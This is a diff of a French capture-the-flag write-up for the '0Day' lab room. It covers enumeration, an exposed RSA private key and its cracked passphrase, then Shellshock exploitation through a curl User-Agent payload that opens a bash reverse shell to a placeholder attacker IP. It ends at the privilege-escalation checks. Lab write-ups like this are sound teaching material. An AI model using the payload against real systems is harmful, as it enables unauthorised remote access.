@@ -2,7 +2,7 @@
 Room de 0Day "Ryan Montgomery", on va test ca !
 C'est parti
 
-# Enum
+# Enumeration
 On commence par l'enumération
 ## Nmap
 ```
@@ -44,11 +44,11 @@ Progress: 220560 / 220561 (100.00%)
 Finished
 ===============================================================
 ```
-### Page admin / uploads
+## Page admin / uploads
 Page blanche.
-### Page secret
+## Page secret
 Image de tortue très choupette !
-### Backup
+## Backup
 Contient une clé RSA
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -64,12 +64,7 @@ IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
 SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
 /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
 w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
-6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
-Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
-xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
-8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
-b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
-vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
+[...REDACTED...]
 wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
 rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
 RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
@@ -97,13 +92,13 @@ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
 Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-letmein          (id_rsa)     
+[...REDACTED...]          (id_rsa)     
 1g 0:00:00:00 DONE (2023-10-09 09:35) 50.00g/s 25600p/s 25600c/s 25600C/s teiubesc..letmein
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
 ```
-J'ai donc le mdp de cette clé : letmein
+J'ai donc le mdp de cette clé !
 
 ## Nikto
 Après un bon moment à me casser les dents sur une connexion SSH, je suis retourner sur le site, afin de trouver une potentielle autre prise. Je vais test un scan avec Nikto.
@@ -140,6 +135,7 @@ Après un bon moment à me casser les dents sur une connexion SSH, je suis retou
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+# Exploitation
 Il trouve un moyen d'injecter des commandes via la vulnérabilité Shellshock
 ```
 + /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
@@ -157,7 +153,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 On va pouvoir avoir un revshell 
 
-# Revshell
+# Post exploitation
 On va donc essaye d'avoir un revshell en exploitant Shellshock
 ```
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/MON-IP 4444 0>&1' http://10.10.189.81/cgi-bin/test.cgi  
@@ -191,7 +187,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 Le 1er flag ce trouve dans le /home
 
-# Privesc to ROOT !
+## Privesc to ROOT !
 En faisant les tests basiques, je constate que la version de linux est vraiment vielle : 
 ```
 Linux version 3.13.0-32-generic
